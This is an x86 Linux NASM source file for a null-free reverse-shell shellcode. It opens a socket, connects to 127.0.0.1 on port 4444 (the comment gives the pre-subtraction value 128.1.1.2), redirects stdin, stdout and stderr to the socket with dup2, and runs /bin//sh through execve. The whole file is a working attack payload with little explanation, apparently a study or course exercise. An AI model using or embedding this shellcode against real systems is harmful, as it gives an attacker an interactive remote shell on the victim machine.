
global _start

section .text

_start:

    ; Zeroing out first 4 registers to work with them.
    xor ebx, ebx
    mul ebx
    xor ecx, ecx

    ; syscall #1 = socket()
    mov ax, 0x167
    mov bl, 0x02
    mov cl, 0x01
    int 0x80
    xchg edi, eax


    ; syscall #2 = connect()
    xor eax, eax
    mov ax, 0x16a
    mov ebx, edi
    xor ecx, ecx
    push ecx

    mov ecx, 0x02010180 ; ip address = 128.1.1.2
    sub ecx, 0x01010101

    push ecx
    push word 0x5C11
    push word 0x02
    mov ecx, esp
    mov dl, 16
    int 0x80


    ; syscall #3 = dup2()
    xor eax, eax
    xor ecx, ecx
    xor ebx, ebx
    mov cl, 0x3

    loop_dup2:
    mov al, 0x3f
    mov ebx, edi
    dec cl
    int 0x80

    jnz loop_dup2

    ; syscall #4 = execve()
    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80
